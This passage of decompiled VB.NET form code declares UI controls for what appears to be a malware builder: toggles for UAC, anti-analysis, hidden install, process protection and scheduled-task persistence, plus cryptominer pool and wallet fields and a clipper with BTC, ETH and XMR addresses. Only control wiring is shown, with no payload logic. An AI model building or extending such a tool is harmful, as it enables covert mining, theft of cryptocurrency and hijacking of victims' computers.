		' Token: 0x170003B7 RID: 951
		' (get) Token: 0x06000955 RID: 2389 RVA: 0x0006CF47 File Offset: 0x0006B147
		' (set) Token: 0x06000956 RID: 2390 RVA: 0x0006CF54 File Offset: 0x0006B154
		Friend Overridable Property UAC As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._UAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.UAC_CheckedChanged
				Dim uac As Guna2ToggleSwitch = Me._UAC
				If uac IsNot Nothing Then
					RemoveHandler uac.CheckedChanged, value2
				End If
				Me._UAC = value
				uac = Me._UAC
				If uac IsNot Nothing Then
					AddHandler uac.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003B8 RID: 952
		' (get) Token: 0x06000957 RID: 2391 RVA: 0x0006CF97 File Offset: 0x0006B197
		' (set) Token: 0x06000958 RID: 2392 RVA: 0x0006CFA1 File Offset: 0x0006B1A1
		Friend Overridable Property TabPage7 As TabPage

		' Token: 0x170003B9 RID: 953
		' (get) Token: 0x06000959 RID: 2393 RVA: 0x0006CFAA File Offset: 0x0006B1AA
		' (set) Token: 0x0600095A RID: 2394 RVA: 0x0006CFB4 File Offset: 0x0006B1B4
		Friend Overridable Property AntiAnalysis As Guna2ToggleSwitch

		' Token: 0x170003BA RID: 954
		' (get) Token: 0x0600095B RID: 2395 RVA: 0x0006CFBD File Offset: 0x0006B1BD
		' (set) Token: 0x0600095C RID: 2396 RVA: 0x0006CFC7 File Offset: 0x0006B1C7
		Friend Overridable Property Label16 As Label

		' Token: 0x170003BB RID: 955
		' (get) Token: 0x0600095D RID: 2397 RVA: 0x0006CFD0 File Offset: 0x0006B1D0
		' (set) Token: 0x0600095E RID: 2398 RVA: 0x0006CFDA File Offset: 0x0006B1DA
		Friend Overridable Property ProcessProtections As Guna2ToggleSwitch

		' Token: 0x170003BC RID: 956
		' (get) Token: 0x0600095F RID: 2399 RVA: 0x0006CFE3 File Offset: 0x0006B1E3
		' (set) Token: 0x06000960 RID: 2400 RVA: 0x0006CFED File Offset: 0x0006B1ED
		Friend Overridable Property Label12 As Label

		' Token: 0x170003BD RID: 957
		' (get) Token: 0x06000961 RID: 2401 RVA: 0x0006CFF6 File Offset: 0x0006B1F6
		' (set) Token: 0x06000962 RID: 2402 RVA: 0x0006D000 File Offset: 0x0006B200
		Friend Overridable Property TabPage8 As TabPage

		' Token: 0x170003BE RID: 958
		' (get) Token: 0x06000963 RID: 2403 RVA: 0x0006D009 File Offset: 0x0006B209
		' (set) Token: 0x06000964 RID: 2404 RVA: 0x0006D014 File Offset: 0x0006B214
		Friend Overridable Property MiningMAX As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._MiningMAX
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.MiningMAX_Scroll
				Dim miningMAX As Guna2TrackBar = Me._MiningMAX
				If miningMAX IsNot Nothing Then
					RemoveHandler miningMAX.Scroll, value2
				End If
				Me._MiningMAX = value
				miningMAX = Me._MiningMAX
				If miningMAX IsNot Nothing Then
					AddHandler miningMAX.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x170003BF RID: 959
		' (get) Token: 0x06000965 RID: 2405 RVA: 0x0006D057 File Offset: 0x0006B257
		' (set) Token: 0x06000966 RID: 2406 RVA: 0x0006D061 File Offset: 0x0006B261
		Friend Overridable Property MiningNumMax As Guna2HtmlLabel

		' Token: 0x170003C0 RID: 960
		' (get) Token: 0x06000967 RID: 2407 RVA: 0x0006D06A File Offset: 0x0006B26A
		' (set) Token: 0x06000968 RID: 2408 RVA: 0x0006D074 File Offset: 0x0006B274
		Friend Overridable Property MiningWorkName As Guna2TextBox

		' Token: 0x170003C1 RID: 961
		' (get) Token: 0x06000969 RID: 2409 RVA: 0x0006D07D File Offset: 0x0006B27D
		' (set) Token: 0x0600096A RID: 2410 RVA: 0x0006D087 File Offset: 0x0006B287
		Friend Overridable Property MiningWalletAddress As Guna2TextBox

		' Token: 0x170003C2 RID: 962
		' (get) Token: 0x0600096B RID: 2411 RVA: 0x0006D090 File Offset: 0x0006B290
		' (set) Token: 0x0600096C RID: 2412 RVA: 0x0006D09C File Offset: 0x0006B29C
		Friend Overridable Property MiningPool As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._MiningPool
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.MiningPool_TextChanged
				Dim value3 As EventHandler = AddressOf Me.MiningPool_IconRightClick
				Dim miningPool As Guna2TextBox = Me._MiningPool
				If miningPool IsNot Nothing Then
					RemoveHandler miningPool.TextChanged, value2
					RemoveHandler miningPool.IconRightClick, value3
				End If
				Me._MiningPool = value
				miningPool = Me._MiningPool
				If miningPool IsNot Nothing Then
					AddHandler miningPool.TextChanged, value2
					AddHandler miningPool.IconRightClick, value3
				End If
			End Set
		End Property

		' Token: 0x170003C3 RID: 963
		' (get) Token: 0x0600096D RID: 2413 RVA: 0x0006D0FA File Offset: 0x0006B2FA
		' (set) Token: 0x0600096E RID: 2414 RVA: 0x0006D104 File Offset: 0x0006B304
		Friend Overridable Property ConBTC As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._ConBTC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.ConBTC_CheckedChanged
				Dim conBTC As UIRadioButton = Me._ConBTC
				If conBTC IsNot Nothing Then
					RemoveHandler conBTC.CheckedChanged, value2
				End If
				Me._ConBTC = value
				conBTC = Me._ConBTC
				If conBTC IsNot Nothing Then
					AddHandler conBTC.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003C4 RID: 964
		' (get) Token: 0x0600096F RID: 2415 RVA: 0x0006D147 File Offset: 0x0006B347
		' (set) Token: 0x06000970 RID: 2416 RVA: 0x0006D151 File Offset: 0x0006B351
		Friend Overridable Property TabPage9 As TabPage

		' Token: 0x170003C5 RID: 965
		' (get) Token: 0x06000971 RID: 2417 RVA: 0x0006D15A File Offset: 0x0006B35A
		' (set) Token: 0x06000972 RID: 2418 RVA: 0x0006D164 File Offset: 0x0006B364
		Friend Overridable Property Guna2HtmlLabel26 As Guna2HtmlLabel

		' Token: 0x170003C6 RID: 966
		' (get) Token: 0x06000973 RID: 2419 RVA: 0x0006D16D File Offset: 0x0006B36D
		' (set) Token: 0x06000974 RID: 2420 RVA: 0x0006D177 File Offset: 0x0006B377
		Friend Overridable Property ETHAddress As Guna2TextBox

		' Token: 0x170003C7 RID: 967
		' (get) Token: 0x06000975 RID: 2421 RVA: 0x0006D180 File Offset: 0x0006B380
		' (set) Token: 0x06000976 RID: 2422 RVA: 0x0006D18A File Offset: 0x0006B38A
		Friend Overridable Property BTCAddress As Guna2TextBox

		' Token: 0x170003C8 RID: 968
		' (get) Token: 0x06000977 RID: 2423 RVA: 0x0006D193 File Offset: 0x0006B393
		' (set) Token: 0x06000978 RID: 2424 RVA: 0x0006D19D File Offset: 0x0006B39D
		Friend Overridable Property XMRAddress As Guna2TextBox

		' Token: 0x170003C9 RID: 969
		' (get) Token: 0x06000979 RID: 2425 RVA: 0x0006D1A6 File Offset: 0x0006B3A6
		' (set) Token: 0x0600097A RID: 2426 RVA: 0x0006D1B0 File Offset: 0x0006B3B0
		Friend Overridable Property TabPage10 As TabPage

		' Token: 0x170003CA RID: 970
		' (get) Token: 0x0600097B RID: 2427 RVA: 0x0006D1B9 File Offset: 0x0006B3B9
		' (set) Token: 0x0600097C RID: 2428 RVA: 0x0006D1C4 File Offset: 0x0006B3C4
		Private Overridable Property build As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._build
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.Build_Click
				Dim build As System.Windows.Forms.Button = Me._build
				If build IsNot Nothing Then
					RemoveHandler build.Click, value2
				End If
				Me._build = value
				build = Me._build
				If build IsNot Nothing Then
					AddHandler build.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003CB RID: 971
		' (get) Token: 0x0600097D RID: 2429 RVA: 0x0006D207 File Offset: 0x0006B407
		' (set) Token: 0x0600097E RID: 2430 RVA: 0x0006D214 File Offset: 0x0006B414
		Private Overridable Property BAssembly As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._BAssembly
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.BAssembly_Click
				Dim bassembly As System.Windows.Forms.Button = Me._BAssembly
				If bassembly IsNot Nothing Then
					RemoveHandler bassembly.Click, value2
				End If
				Me._BAssembly = value
				bassembly = Me._BAssembly
				If bassembly IsNot Nothing Then
					AddHandler bassembly.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003CC RID: 972
		' (get) Token: 0x0600097F RID: 2431 RVA: 0x0006D257 File Offset: 0x0006B457
		' (set) Token: 0x06000980 RID: 2432 RVA: 0x0006D264 File Offset: 0x0006B464
		Private Overridable Property BClipper As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._BClipper
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.BClipper_Click
				Dim bclipper As System.Windows.Forms.Button = Me._BClipper
				If bclipper IsNot Nothing Then
					RemoveHandler bclipper.Click, value2
				End If
				Me._BClipper = value
				bclipper = Me._BClipper
				If bclipper IsNot Nothing Then
					AddHandler bclipper.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003CD RID: 973
		' (get) Token: 0x06000981 RID: 2433 RVA: 0x0006D2A7 File Offset: 0x0006B4A7
		' (set) Token: 0x06000982 RID: 2434 RVA: 0x0006D2B4 File Offset: 0x0006B4B4
		Private Overridable Property Bmining As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._Bmining
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.Bmining_Click
				Dim bmining As System.Windows.Forms.Button = Me._Bmining
				If bmining IsNot Nothing Then
					RemoveHandler bmining.Click, value2
				End If
				Me._Bmining = value
				bmining = Me._Bmining
				If bmining IsNot Nothing Then
					AddHandler bmining.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003CE RID: 974
		' (get) Token: 0x06000983 RID: 2435 RVA: 0x0006D2F7 File Offset: 0x0006B4F7
		' (set) Token: 0x06000984 RID: 2436 RVA: 0x0006D304 File Offset: 0x0006B504
		Private Overridable Property BSecurity As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._BSecurity
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.BSecurity_Click
				Dim bsecurity As System.Windows.Forms.Button = Me._BSecurity
				If bsecurity IsNot Nothing Then
					RemoveHandler bsecurity.Click, value2
				End If
				Me._BSecurity = value
				bsecurity = Me._BSecurity
				If bsecurity IsNot Nothing Then
					AddHandler bsecurity.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003CF RID: 975
		' (get) Token: 0x06000985 RID: 2437 RVA: 0x0006D347 File Offset: 0x0006B547
		' (set) Token: 0x06000986 RID: 2438 RVA: 0x0006D354 File Offset: 0x0006B554
		Private Overridable Property Binstall As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._Binstall
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.Binstall_Click
				Dim binstall As System.Windows.Forms.Button = Me._Binstall
				If binstall IsNot Nothing Then
					RemoveHandler binstall.Click, value2
				End If
				Me._Binstall = value
				binstall = Me._Binstall
				If binstall IsNot Nothing Then
					AddHandler binstall.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003D0 RID: 976
		' (get) Token: 0x06000987 RID: 2439 RVA: 0x0006D397 File Offset: 0x0006B597
		' (set) Token: 0x06000988 RID: 2440 RVA: 0x0006D3A1 File Offset: 0x0006B5A1
		Friend Overridable Property Panel3 As System.Windows.Forms.Panel

		' Token: 0x170003D1 RID: 977
		' (get) Token: 0x06000989 RID: 2441 RVA: 0x0006D3AA File Offset: 0x0006B5AA
		' (set) Token: 0x0600098A RID: 2442 RVA: 0x0006D3B4 File Offset: 0x0006B5B4
		Friend Overridable Property Label4 As Label

		' Token: 0x170003D2 RID: 978
		' (get) Token: 0x0600098B RID: 2443 RVA: 0x0006D3BD File Offset: 0x0006B5BD
		' (set) Token: 0x0600098C RID: 2444 RVA: 0x0006D3C8 File Offset: 0x0006B5C8
		Friend Overridable Property KeEncrypt As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._KeEncrypt
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.KeEncrypt_IconRightClick
				Dim keEncrypt As Guna2TextBox = Me._KeEncrypt
				If keEncrypt IsNot Nothing Then
					RemoveHandler keEncrypt.IconRightClick, value2
				End If
				Me._KeEncrypt = value
				keEncrypt = Me._KeEncrypt
				If keEncrypt IsNot Nothing Then
					AddHandler keEncrypt.IconRightClick, value2
				End If
			End Set
		End Property

		' Token: 0x170003D3 RID: 979
		' (get) Token: 0x0600098D RID: 2445 RVA: 0x0006D40B File Offset: 0x0006B60B
		' (set) Token: 0x0600098E RID: 2446 RVA: 0x0006D415 File Offset: 0x0006B615
		Friend Overridable Property Guna2HtmlLabel7 As Guna2HtmlLabel

		' Token: 0x170003D4 RID: 980
		' (get) Token: 0x0600098F RID: 2447 RVA: 0x0006D41E File Offset: 0x0006B61E
		' (set) Token: 0x06000990 RID: 2448 RVA: 0x0006D428 File Offset: 0x0006B628
		Friend Overridable Property DiscordText As Guna2TextBox

		' Token: 0x170003D5 RID: 981
		' (get) Token: 0x06000991 RID: 2449 RVA: 0x0006D431 File Offset: 0x0006B631
		' (set) Token: 0x06000992 RID: 2450 RVA: 0x0006D43B File Offset: 0x0006B63B
		Friend Overridable Property GroupBoxConnectionHost As Guna2GroupBox

		' Token: 0x170003D6 RID: 982
		' (get) Token: 0x06000993 RID: 2451 RVA: 0x0006D444 File Offset: 0x0006B644
		' (set) Token: 0x06000994 RID: 2452 RVA: 0x0006D44E File Offset: 0x0006B64E
		Friend Overridable Property GroupBoxDataEncrypt As Guna2GroupBox

		' Token: 0x170003D7 RID: 983
		' (get) Token: 0x06000995 RID: 2453 RVA: 0x0006D457 File Offset: 0x0006B657
		' (set) Token: 0x06000996 RID: 2454 RVA: 0x0006D461 File Offset: 0x0006B661
		Friend Overridable Property GroupBoxNameClient As Guna2GroupBox

		' Token: 0x170003D8 RID: 984
		' (get) Token: 0x06000997 RID: 2455 RVA: 0x0006D46A File Offset: 0x0006B66A
		' (set) Token: 0x06000998 RID: 2456 RVA: 0x0006D474 File Offset: 0x0006B674
		Friend Overridable Property Label5 As Label

		' Token: 0x170003D9 RID: 985
		' (get) Token: 0x06000999 RID: 2457 RVA: 0x0006D47D File Offset: 0x0006B67D
		' (set) Token: 0x0600099A RID: 2458 RVA: 0x0006D487 File Offset: 0x0006B687
		Friend Overridable Property PictureBox16 As System.Windows.Forms.PictureBox

		' Token: 0x170003DA RID: 986
		' (get) Token: 0x0600099B RID: 2459 RVA: 0x0006D490 File Offset: 0x0006B690
		' (set) Token: 0x0600099C RID: 2460 RVA: 0x0006D49A File Offset: 0x0006B69A
		Friend Overridable Property GroupBoxNotif As Guna2GroupBox

		' Token: 0x170003DB RID: 987
		' (get) Token: 0x0600099D RID: 2461 RVA: 0x0006D4A3 File Offset: 0x0006B6A3
		' (set) Token: 0x0600099E RID: 2462 RVA: 0x0006D4AD File Offset: 0x0006B6AD
		Friend Overridable Property Label9 As Label

		' Token: 0x170003DC RID: 988
		' (get) Token: 0x0600099F RID: 2463 RVA: 0x0006D4B6 File Offset: 0x0006B6B6
		' (set) Token: 0x060009A0 RID: 2464 RVA: 0x0006D4C0 File Offset: 0x0006B6C0
		Friend Overridable Property DiscordNotif As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._DiscordNotif
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.DiscordNotif_CheckedChanged
				Dim discordNotif As Guna2ToggleSwitch = Me._DiscordNotif
				If discordNotif IsNot Nothing Then
					RemoveHandler discordNotif.CheckedChanged, value2
				End If
				Me._DiscordNotif = value
				discordNotif = Me._DiscordNotif
				If discordNotif IsNot Nothing Then
					AddHandler discordNotif.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003DD RID: 989
		' (get) Token: 0x060009A1 RID: 2465 RVA: 0x0006D503 File Offset: 0x0006B703
		' (set) Token: 0x060009A2 RID: 2466 RVA: 0x0006D50D File Offset: 0x0006B70D
		Friend Overridable Property Label27 As Label

		' Token: 0x170003DE RID: 990
		' (get) Token: 0x060009A3 RID: 2467 RVA: 0x0006D516 File Offset: 0x0006B716
		' (set) Token: 0x060009A4 RID: 2468 RVA: 0x0006D520 File Offset: 0x0006B720
		Friend Overridable Property PictureBox15 As System.Windows.Forms.PictureBox

		' Token: 0x170003DF RID: 991
		' (get) Token: 0x060009A5 RID: 2469 RVA: 0x0006D529 File Offset: 0x0006B729
		' (set) Token: 0x060009A6 RID: 2470 RVA: 0x0006D533 File Offset: 0x0006B733
		Friend Overridable Property GroupBoxConnectionRefresh As Guna2GroupBox

		' Token: 0x170003E0 RID: 992
		' (get) Token: 0x060009A7 RID: 2471 RVA: 0x0006D53C File Offset: 0x0006B73C
		' (set) Token: 0x060009A8 RID: 2472 RVA: 0x0006D546 File Offset: 0x0006B746
		Friend Overridable Property Label7 As Label

		' Token: 0x170003E1 RID: 993
		' (get) Token: 0x060009A9 RID: 2473 RVA: 0x0006D54F File Offset: 0x0006B74F
		' (set) Token: 0x060009AA RID: 2474 RVA: 0x0006D55C File Offset: 0x0006B75C
		Friend Overridable Property RefreshConnect As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._RefreshConnect
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.RefreshConnect_KeyPress
				Dim refreshConnect As Guna2TextBox = Me._RefreshConnect
				If refreshConnect IsNot Nothing Then
					RemoveHandler refreshConnect.KeyPress, value2
				End If
				Me._RefreshConnect = value
				refreshConnect = Me._RefreshConnect
				If refreshConnect IsNot Nothing Then
					AddHandler refreshConnect.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170003E2 RID: 994
		' (get) Token: 0x060009AB RID: 2475 RVA: 0x0006D59F File Offset: 0x0006B79F
		' (set) Token: 0x060009AC RID: 2476 RVA: 0x0006D5A9 File Offset: 0x0006B7A9
		Friend Overridable Property Label3 As Label

		' Token: 0x170003E3 RID: 995
		' (get) Token: 0x060009AD RID: 2477 RVA: 0x0006D5B2 File Offset: 0x0006B7B2
		' (set) Token: 0x060009AE RID: 2478 RVA: 0x0006D5BC File Offset: 0x0006B7BC
		Friend Overridable Property PictureBox14 As System.Windows.Forms.PictureBox

		' Token: 0x170003E4 RID: 996
		' (get) Token: 0x060009AF RID: 2479 RVA: 0x0006D5C5 File Offset: 0x0006B7C5
		' (set) Token: 0x060009B0 RID: 2480 RVA: 0x0006D5CF File Offset: 0x0006B7CF
		Friend Overridable Property PictureBox12 As System.Windows.Forms.PictureBox

		' Token: 0x170003E5 RID: 997
		' (get) Token: 0x060009B1 RID: 2481 RVA: 0x0006D5D8 File Offset: 0x0006B7D8
		' (set) Token: 0x060009B2 RID: 2482 RVA: 0x0006D5E2 File Offset: 0x0006B7E2
		Friend Overridable Property PictureBox13 As System.Windows.Forms.PictureBox

		' Token: 0x170003E6 RID: 998
		' (get) Token: 0x060009B3 RID: 2483 RVA: 0x0006D5EB File Offset: 0x0006B7EB
		' (set) Token: 0x060009B4 RID: 2484 RVA: 0x0006D5F5 File Offset: 0x0006B7F5
		Friend Overridable Property PictureBox17 As System.Windows.Forms.PictureBox

		' Token: 0x170003E7 RID: 999
		' (get) Token: 0x060009B5 RID: 2485 RVA: 0x0006D5FE File Offset: 0x0006B7FE
		' (set) Token: 0x060009B6 RID: 2486 RVA: 0x0006D608 File Offset: 0x0006B808
		Friend Overridable Property Label6 As Label

		' Token: 0x170003E8 RID: 1000
		' (get) Token: 0x060009B7 RID: 2487 RVA: 0x0006D611 File Offset: 0x0006B811
		' (set) Token: 0x060009B8 RID: 2488 RVA: 0x0006D61B File Offset: 0x0006B81B
		Friend Overridable Property Column22 As DataGridViewTextBoxColumn

		' Token: 0x170003E9 RID: 1001
		' (get) Token: 0x060009B9 RID: 2489 RVA: 0x0006D624 File Offset: 0x0006B824
		' (set) Token: 0x060009BA RID: 2490 RVA: 0x0006D62E File Offset: 0x0006B82E
		Friend Overridable Property Column23 As DataGridViewTextBoxColumn

		' Token: 0x170003EA RID: 1002
		' (get) Token: 0x060009BB RID: 2491 RVA: 0x0006D637 File Offset: 0x0006B837
		' (set) Token: 0x060009BC RID: 2492 RVA: 0x0006D641 File Offset: 0x0006B841
		Friend Overridable Property Guna2GroupBox6 As Guna2GroupBox

		' Token: 0x170003EB RID: 1003
		' (get) Token: 0x060009BD RID: 2493 RVA: 0x0006D64A File Offset: 0x0006B84A
		' (set) Token: 0x060009BE RID: 2494 RVA: 0x0006D654 File Offset: 0x0006B854
		Friend Overridable Property Label28 As Label

		' Token: 0x170003EC RID: 1004
		' (get) Token: 0x060009BF RID: 2495 RVA: 0x0006D65D File Offset: 0x0006B85D
		' (set) Token: 0x060009C0 RID: 2496 RVA: 0x0006D667 File Offset: 0x0006B867
		Friend Overridable Property PictureBox19 As System.Windows.Forms.PictureBox

		' Token: 0x170003ED RID: 1005
		' (get) Token: 0x060009C1 RID: 2497 RVA: 0x0006D670 File Offset: 0x0006B870
		' (set) Token: 0x060009C2 RID: 2498 RVA: 0x0006D67A File Offset: 0x0006B87A
		Friend Overridable Property PictureBox18 As System.Windows.Forms.PictureBox

		' Token: 0x170003EE RID: 1006
		' (get) Token: 0x060009C3 RID: 2499 RVA: 0x0006D683 File Offset: 0x0006B883
		' (set) Token: 0x060009C4 RID: 2500 RVA: 0x0006D68D File Offset: 0x0006B88D
		Friend Overridable Property Guna2HtmlLabel32 As Guna2HtmlLabel

		' Token: 0x170003EF RID: 1007
		' (get) Token: 0x060009C5 RID: 2501 RVA: 0x0006D696 File Offset: 0x0006B896
		' (set) Token: 0x060009C6 RID: 2502 RVA: 0x0006D6A0 File Offset: 0x0006B8A0
		Friend Overridable Property Guna2HtmlLabel33 As Guna2HtmlLabel

		' Token: 0x170003F0 RID: 1008
		' (get) Token: 0x060009C7 RID: 2503 RVA: 0x0006D6A9 File Offset: 0x0006B8A9
		' (set) Token: 0x060009C8 RID: 2504 RVA: 0x0006D6B3 File Offset: 0x0006B8B3
		Friend Overridable Property Guna2GroupBox11 As Guna2GroupBox

		' Token: 0x170003F1 RID: 1009
		' (get) Token: 0x060009C9 RID: 2505 RVA: 0x0006D6BC File Offset: 0x0006B8BC
		' (set) Token: 0x060009CA RID: 2506 RVA: 0x0006D6C6 File Offset: 0x0006B8C6
		Friend Overridable Property Label38 As Label

		' Token: 0x170003F2 RID: 1010
		' (get) Token: 0x060009CB RID: 2507 RVA: 0x0006D6CF File Offset: 0x0006B8CF
		' (set) Token: 0x060009CC RID: 2508 RVA: 0x0006D6D9 File Offset: 0x0006B8D9
		Friend Overridable Property Runwithhighestprivileges As Guna2ToggleSwitch

		' Token: 0x170003F3 RID: 1011
		' (get) Token: 0x060009CD RID: 2509 RVA: 0x0006D6E2 File Offset: 0x0006B8E2
		' (set) Token: 0x060009CE RID: 2510 RVA: 0x0006D6EC File Offset: 0x0006B8EC
		Friend Overridable Property Label36 As Label

		' Token: 0x170003F4 RID: 1012
		' (get) Token: 0x060009CF RID: 2511 RVA: 0x0006D6F5 File Offset: 0x0006B8F5
		' (set) Token: 0x060009D0 RID: 2512 RVA: 0x0006D6FF File Offset: 0x0006B8FF
		Friend Overridable Property Label37 As Label

		' Token: 0x170003F5 RID: 1013
		' (get) Token: 0x060009D1 RID: 2513 RVA: 0x0006D708 File Offset: 0x0006B908
		' (set) Token: 0x060009D2 RID: 2514 RVA: 0x0006D712 File Offset: 0x0006B912
		Friend Overridable Property PictureBox24 As System.Windows.Forms.PictureBox

		' Token: 0x170003F6 RID: 1014
		' (get) Token: 0x060009D3 RID: 2515 RVA: 0x0006D71B File Offset: 0x0006B91B
		' (set) Token: 0x060009D4 RID: 2516 RVA: 0x0006D728 File Offset: 0x0006B928
		Friend Overridable Property TaskShc As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._TaskShc
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.TaskShc_CheckedChanged
				Dim taskShc As Guna2ToggleSwitch = Me._TaskShc
				If taskShc IsNot Nothing Then
					RemoveHandler taskShc.CheckedChanged, value2
				End If
				Me._TaskShc = value
				taskShc = Me._TaskShc
				If taskShc IsNot Nothing Then
					AddHandler taskShc.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003F7 RID: 1015
		' (get) Token: 0x060009D5 RID: 2517 RVA: 0x0006D76B File Offset: 0x0006B96B
		' (set) Token: 0x060009D6 RID: 2518 RVA: 0x0006D775 File Offset: 0x0006B975
		Friend Overridable Property Guna2GroupBox10 As Guna2GroupBox

		' Token: 0x170003F8 RID: 1016
		' (get) Token: 0x060009D7 RID: 2519 RVA: 0x0006D77E File Offset: 0x0006B97E
		' (set) Token: 0x060009D8 RID: 2520 RVA: 0x0006D788 File Offset: 0x0006B988
		Friend Overridable Property Label34 As Label

		' Token: 0x170003F9 RID: 1017
		' (get) Token: 0x060009D9 RID: 2521 RVA: 0x0006D791 File Offset: 0x0006B991
		' (set) Token: 0x060009DA RID: 2522 RVA: 0x0006D79B File Offset: 0x0006B99B
		Friend Overridable Property Label35 As Label

		' Token: 0x170003FA RID: 1018
		' (get) Token: 0x060009DB RID: 2523 RVA: 0x0006D7A4 File Offset: 0x0006B9A4
		' (set) Token: 0x060009DC RID: 2524 RVA: 0x0006D7AE File Offset: 0x0006B9AE
		Friend Overridable Property PictureBox23 As System.Windows.Forms.PictureBox

		' Token: 0x170003FB RID: 1019
		' (get) Token: 0x060009DD RID: 2525 RVA: 0x0006D7B7 File Offset: 0x0006B9B7
		' (set) Token: 0x060009DE RID: 2526 RVA: 0x0006D7C1 File Offset: 0x0006B9C1
		Friend Overridable Property ProtectInstallationFolder As Guna2ToggleSwitch

		' Token: 0x170003FC RID: 1020
		' (get) Token: 0x060009DF RID: 2527 RVA: 0x0006D7CA File Offset: 0x0006B9CA
		' (set) Token: 0x060009E0 RID: 2528 RVA: 0x0006D7D4 File Offset: 0x0006B9D4
		Friend Overridable Property Guna2GroupBox9 As Guna2GroupBox

		' Token: 0x170003FD RID: 1021
		' (get) Token: 0x060009E1 RID: 2529 RVA: 0x0006D7DD File Offset: 0x0006B9DD
		' (set) Token: 0x060009E2 RID: 2530 RVA: 0x0006D7E7 File Offset: 0x0006B9E7
		Friend Overridable Property Label32 As Label

		' Token: 0x170003FE RID: 1022
		' (get) Token: 0x060009E3 RID: 2531 RVA: 0x0006D7F0 File Offset: 0x0006B9F0
		' (set) Token: 0x060009E4 RID: 2532 RVA: 0x0006D7FA File Offset: 0x0006B9FA
		Friend Overridable Property Label33 As Label

		' Token: 0x170003FF RID: 1023
		' (get) Token: 0x060009E5 RID: 2533 RVA: 0x0006D803 File Offset: 0x0006BA03
		' (set) Token: 0x060009E6 RID: 2534 RVA: 0x0006D80D File Offset: 0x0006BA0D
		Friend Overridable Property PictureBox22 As System.Windows.Forms.PictureBox

		' Token: 0x17000400 RID: 1024
		' (get) Token: 0x060009E7 RID: 2535 RVA: 0x0006D816 File Offset: 0x0006BA16
		' (set) Token: 0x060009E8 RID: 2536 RVA: 0x0006D820 File Offset: 0x0006BA20
		Friend Overridable Property HiddenInstall As Guna2ToggleSwitch

		' Token: 0x17000401 RID: 1025
		' (get) Token: 0x060009E9 RID: 2537 RVA: 0x0006D829 File Offset: 0x0006BA29
		' (set) Token: 0x060009EA RID: 2538 RVA: 0x0006D833 File Offset: 0x0006BA33
		Friend Overridable Property Guna2GroupBox8 As Guna2GroupBox

		' Token: 0x17000402 RID: 1026
		' (get) Token: 0x060009EB RID: 2539 RVA: 0x0006D83C File Offset: 0x0006BA3C
		' (set) Token: 0x060009EC RID: 2540 RVA: 0x0006D846 File Offset: 0x0006BA46
		Friend Overridable Property Label31 As Label

		' Token: 0x17000403 RID: 1027
		' (get) Token: 0x060009ED RID: 2541 RVA: 0x0006D84F File Offset: 0x0006BA4F
		' (set) Token: 0x060009EE RID: 2542 RVA: 0x0006D859 File Offset: 0x0006BA59
